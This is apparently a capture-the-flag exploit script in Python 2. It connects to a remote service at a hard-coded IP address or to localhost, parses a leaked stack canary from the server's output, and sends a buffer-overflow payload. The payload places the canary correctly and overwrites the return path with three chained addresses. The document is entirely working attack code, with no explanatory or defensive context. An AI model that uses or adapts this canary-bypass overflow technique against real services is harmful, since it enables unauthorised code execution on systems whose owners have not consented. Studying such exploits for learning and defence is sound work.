import socket
import struct
import sys

global target_addr
global target_port

def main():
        if sys.argv[1] == '-r':
		target_addr = "133.130.115.234"
        else:
                target_addr = "localhost"

        target_port = 10004

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_addr,target_port))

	#str = s.recv(1024)
	#print(str)
	#hex = int(str[9:18],16)
	#print "[+] Hex of Return Address is %x" % hex
	#ra = struct.pack("<I",hex)
	#print "[+] Return Address = %s" % ra
	str = s.recv(1024)
	print(str)
	hex = int(str[9:19],16)
	canary = struct.pack("<I",hex)
	str = "{0:X}".format(hex)
	print(str)

	buf = 'A' * 20
	buf += canary
        buf += 'AAAA' * 3
	buf += struct.pack('<I',0x08048701)
	buf += struct.pack('<I',0x08048713)
	buf += struct.pack('<I',0x08048727)
	#buf += ra
	buf += "\n"

	s.send(buf);
	str = s.recv(1024)
	print(str)
        str = s.recv(1024)
        print(str)

if __name__ == '__main__':
	main()
